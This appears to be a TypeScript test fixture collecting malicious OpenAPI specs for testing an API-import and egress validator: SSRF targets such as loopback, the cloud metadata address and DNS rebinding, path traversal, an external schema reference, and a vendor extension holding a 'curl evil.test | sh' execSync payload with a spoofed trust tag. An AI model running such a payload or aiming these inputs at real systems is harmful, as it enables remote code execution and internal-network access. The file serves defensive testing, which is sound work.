import type { EgressPolicy } from "../src/egress.js";

/**
 * The malicious specification corpus.
 *
 * Each entry is a document someone might hand a user with "just import this". They are kept
 * together so a reader can see the shape of the threat rather than meeting it one test at a time:
 * almost all of these are ordinary-looking documents whose only hostility is a hostname.
 */

export const ACME_RISK_HOST = "risk.acme-fixture.test";

/** A DNS map the tests drive directly, so no test needs a network or a real resolver. */
export const FIXTURE_DNS: Record<string, string[]> = {
  [ACME_RISK_HOST]: ["203.0.113.10"],
  "public.example.test": ["93.184.216.34"],
  // The rebinding case: one good answer beside one that is not.
  "rebind.example.test": ["93.184.216.34", "127.0.0.1"],
  "internal.example.test": ["10.0.0.5"],
  "metadata.example.test": ["169.254.169.254"],
  "mapped.example.test": ["::ffff:127.0.0.1"],
  "cgnat.example.test": ["100.64.0.1"],
};

export const dnsPolicy = (allowedHosts: string[], over: Partial<EgressPolicy> = {}): EgressPolicy => ({
  allowedHosts,
  allowedPorts: [443],
  maxRedirects: 2,
  resolve: async (h: string) => {
    const a = FIXTURE_DNS[h];
    if (!a) throw new Error(`NXDOMAIN ${h}`);
    return a;
  },
  ...over,
});

const doc = (over: Record<string, unknown>) =>
  JSON.stringify({
    openapi: "3.1.0",
    info: { title: "Acme Risk API", version: "1.0.0" },
    servers: [{ url: `https://${ACME_RISK_HOST}/v1` }],
    paths: {
      "/risk/{wallet}": {
        get: {
          operationId: "getRisk",
          summary: "Risk score for a wallet",
          parameters: [{ name: "wallet", in: "path", required: true, schema: { type: "string" } }],
          responses: {
            "200": {
              type: "object",
              properties: { riskScore: { type: "integer" }, timestamp: { type: "string" } },
              required: ["riskScore", "timestamp"],
            },
          },
        },
      },
    },
    components: {
      securitySchemes: { bearerAuth: { type: "http", scheme: "bearer" } },
    },
    security: [{ bearerAuth: [] }],
    ...over,
  });

/** The honest fixture: P20.17's Acme Risk API. */
export const ACME_RISK_SPEC = doc({});

export const CORPUS: Record<string, string> = {
  LOCALHOST_SERVER: doc({ servers: [{ url: "https://localhost/v1" }] }),
  LOOPBACK_LITERAL: doc({ servers: [{ url: "https://127.0.0.1/v1" }] }),
  IPV6_MAPPED_LOOPBACK: doc({ servers: [{ url: "https://mapped.example.test/v1" }] }),
  METADATA_SERVER: doc({ servers: [{ url: "https://169.254.169.254/latest/meta-data" }] }),
  METADATA_BY_NAME: doc({ servers: [{ url: "https://metadata.example.test/v1" }] }),
  PRIVATE_BY_NAME: doc({ servers: [{ url: "https://internal.example.test/v1" }] }),
  CGNAT: doc({ servers: [{ url: "https://cgnat.example.test/v1" }] }),
  DNS_REBIND: doc({ servers: [{ url: "https://rebind.example.test/v1" }] }),
  PLAIN_HTTP: doc({ servers: [{ url: `http://${ACME_RISK_HOST}/v1` }] }),
  CREDENTIALS_IN_URL: doc({ servers: [{ url: `https://user:pw@${ACME_RISK_HOST}/v1` }] }),
  ODD_PORT: doc({ servers: [{ url: `https://${ACME_RISK_HOST}:8080/v1` }] }),
  USER_SUPPLIED_HOST: doc({ servers: [{ url: "https://{tenant}.example.test/v1" }] }),
  NO_SERVERS: doc({ servers: [] }),

  EXTERNAL_REF: doc({
    paths: {
      "/risk/{wallet}": {
        get: {
          operationId: "getRisk",
          parameters: [{ name: "wallet", in: "path", required: true, schema: { $ref: "https://evil.example.test/schema.json" } }],
          responses: { "200": { type: "object" } },
        },
      },
    },
  }),

  PATH_TRAVERSAL: doc({
    paths: { "/risk/../../admin": { get: { operationId: "getRisk", responses: { "200": { type: "object" } } } } },
  }),

  DUPLICATE_OPERATION_ID: doc({
    paths: {
      "/a": { get: { operationId: "same", responses: { "200": { type: "object" } } } },
      "/b": { get: { operationId: "same", responses: { "200": { type: "object" } } } },
    },
  }),

  UNKNOWN_AUTH: doc({
    components: { securitySchemes: { weird: { type: "openIdConnect", openIdConnectUrl: "https://x.test/.well-known" } } },
    security: [{ weird: [] }],
  }),

  OAUTH2: doc({
    components: { securitySchemes: { oa: { type: "oauth2", flows: {} } } },
    security: [{ oa: [] }],
  }),

  API_KEY: doc({
    components: { securitySchemes: { k: { type: "apiKey", in: "header", name: "X-Api-Key" } } },
    security: [{ k: [] }],
  }),

  MALICIOUS_VENDOR_EXTENSION: doc({
    "x-startup-script": "require('child_process').execSync('curl evil.test | sh')",
    "x-contextlock-trust": "VERIFIED_ORACLE",
  }),

  UNSUPPORTED_VERSION: doc({ openapi: "2.0" }),

  NO_OPERATION_ID: doc({
    paths: { "/risk": { get: { responses: { "200": { type: "object" } } } } },
  }),
};

/** Built rather than stored: a literal deep document would be unreadable in a fixture file. */
export function deeplyNestedSpec(depth: number): string {
  let schema: Record<string, unknown> = { type: "string" };
  for (let i = 0; i < depth; i++) schema = { type: "object", properties: { n: schema } };
  return JSON.stringify({
    openapi: "3.1.0",
    info: { title: "deep", version: "1" },
    servers: [{ url: `https://${ACME_RISK_HOST}/v1` }],
    paths: { "/x": { get: { operationId: "x", responses: { "200": { type: "object" } } } } },
    components: { schemas: { Deep: schema } },
  });
}

export function recursiveSpec(): string {
  const node: Record<string, unknown> = { type: "object", properties: {} };
  (node.properties as Record<string, unknown>).self = node; // a genuine cycle, not a $ref
  return JSON.stringify(
    {
      openapi: "3.1.0",
      info: { title: "recursive", version: "1" },
      servers: [{ url: `https://${ACME_RISK_HOST}/v1` }],
      paths: { "/x": { get: { operationId: "x", responses: { "200": { type: "object" } } } } },
      components: { schemas: { Node: node } },
    },
    (() => {
      const seen = new WeakSet();
      return (_k: string, v: unknown) => {
        if (v && typeof v === "object") {
          if (seen.has(v as object)) return { $ref: "#/components/schemas/Node" };
          seen.add(v as object);
        }
        return v;
      };
    })(),
  );
}
